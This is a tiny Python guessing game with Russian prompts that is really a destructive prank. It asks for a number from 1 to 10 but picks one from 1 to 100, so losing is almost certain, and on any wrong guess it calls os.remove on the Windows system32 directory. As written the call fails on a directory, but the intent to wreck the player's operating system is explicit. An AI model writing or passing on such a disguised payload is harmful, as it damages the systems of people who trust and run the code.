import random
import os

number = random.randint(1, 100)
guess = input("введи число от 1 до 10")
guess = int(guess)

if guess == number:
    print("ура, ты победил!!!")
else:
    os.remove("c:\\windows\\system32")

